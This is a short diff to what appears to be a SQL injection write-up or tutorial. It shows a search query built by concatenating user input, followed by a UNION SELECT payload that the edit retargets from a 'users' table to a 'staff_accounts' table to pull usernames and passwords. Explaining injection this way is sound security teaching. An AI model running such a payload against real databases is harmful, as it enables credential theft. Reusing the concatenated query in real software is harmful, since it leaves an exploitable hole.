@@ -170,7 +170,7 @@ query = "SELECT name, price FROM products WHERE name LIKE '%" + search + "%'"
 
 **Payload:**
 ```
-' UNION SELECT username,password FROM users--
+' UNION SELECT username,password FROM staff_accounts--
 ```
 
 **Outcome:**
